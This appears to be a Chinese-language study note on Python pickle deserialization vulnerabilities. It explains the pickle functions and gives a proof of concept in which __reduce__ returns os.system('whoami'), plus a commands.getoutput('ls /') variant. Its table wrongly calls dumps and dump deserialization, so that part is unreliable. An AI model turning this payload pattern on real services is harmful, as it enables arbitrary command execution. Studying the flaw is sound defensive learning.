## python反序列化

### 基础知识

> python 中的pickle模块中的一些函数可以对数据序列化和反序列化

| 函数  | 说明                             |
| ----- | -------------------------------- |
| dumps | 对象反序列化为bytes对象          |
| dump  | 对象反序列化到文件对象，存入文件 |
| loads | 从bytes对象反序列化              |
| load  | 对象反序列化，从文件中读取数据   |

* `pickle.dump`(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*, *buffer_callback=None*)

  `obj`------->对象

  `file`------>存入的文件，后缀名为`.pkl`,必须以二进制可写模式打开`wb`

  `protocol`-------->是pickle的版本，目前`Python 3.9.1`,范围为0到最高`pickle.HIGHEST_PROTOCOL`为5，默认的`DEFAULT_PROTOCOL`为4，指定一个负数就相当于指定 `HIGHEST_PROTOCOL`。

  `Pickler(file, protocol).dump(obj)` 实现的功能跟 `pickle.dump() `是一样的。

  ![image-20210910130717888](D:\Users\L--N\Desktop\MD\security\picture\image-20210910130717888.png)

* `pickle.dumps`(*obj*, *protocol=None*, ***, *fix_imports=True*, *buffer_callback=None*)

  dumps与dump的区别就是dumps不需要写入到文件中，直接返回`bytes`对象

* `pickle.load`(*file*, ***, *fix_imports=True*, *encoding="ASCII"*, *errors="strict"*, *buffers=None*)

  `file`-------->以二进制读取`rb`

* `pickle.loads`(*bytes_object*, ***, *fix_imports=True*, *encoding="ASCII"*, *errors="strict"*, *buffers=None*)

```python
>>> import pickle
>>> import os
>>> pickle.dump(123,open('123.pkl','wb'))
>>> pickle.load(open('123.pkl','rb'))
123
>>> pickle.dumps(123)
b'\x80\x04K{.'
>>> pickle.loads(b'\x80\x04K{.')
123
```

可以序列化的对象

![77654499](D:\Users\L--N\Desktop\MD\security\picture\77654499.png)

### pickle反序列化漏洞

造成python反序列化漏洞的主要原因是`__reduce()__`魔法函数，它会在反序列化结束的时候调用。

另外`pickle.loads`会解决`import`问题，对于未引入的`module`会自动尝试`import`。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。

> `object.__reduce__`()
>
> ![image-20210910141404968](D:\Users\L--N\Desktop\MD\security\picture\image-20210910141404968.png)

该函数需要返回一个元组，第一个参数为可调用对象，第二个是可调用对象的参数

> 在python2中只有内置类才有`__reduce__`方法，即用`class A(object)`声明的类，而`python3`中已经默认都是内置类了

`POC`

```python
import pickle
import os

class A(object):
    def __reduce__(self):
        cmd = "whoami" 
        return (os.system,(cmd,))

if __name__ == "__main__":
    test = A()
    result1 = pickle.dumps(test)
    result2 = pickle.loads(result1)
    

➜ python 4.py
laptop-rhthcab2\l--n
```

> #os.system和os.popen 
> `os.system` 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0
> `os.popen()` 无法读取程序执行的返回值
>
> 
>
> 这两个以`print`才能输出结果，如果是以`return`返回的就不会显示结果。
>
> `commands.getoutput()`这个函数来进行代替
>
> ```python
> class payload(object):
>  def __reduce__(self):
>      return (commands.getoutput,('ls /',))
> ```






more:

`PVM`、`详解`、`opcode`

(https://xz.aliyun.com/t/7436#toc-9)

